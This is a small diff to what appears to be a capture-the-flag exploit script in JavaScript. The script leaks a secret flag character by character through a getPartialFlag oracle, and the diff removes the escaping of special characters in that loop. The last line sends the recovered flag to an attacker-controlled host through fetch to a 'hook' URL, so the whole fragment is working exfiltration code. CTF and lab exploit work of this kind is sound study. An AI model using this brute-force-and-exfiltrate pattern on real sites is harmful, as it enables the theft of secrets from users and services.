@@ -19,7 +19,7 @@ async function getPartialFlag(char){
 async function getFlag(chars) {
  var b = false; var char;
  for(var i=0; i < chars.length; i++){
- char = special.includes(chars[i]) ? '\\'+chars[i]:chars[i];
+ char = chars[i];
  await getPartialFlag(char).then((res) => {flag=flag.concat(res); b = res==='}' ? true:false; i=0} , (res)=> { } );
  if(b) break;}
  fetch(`https://${hook}/flag=${flag}`);
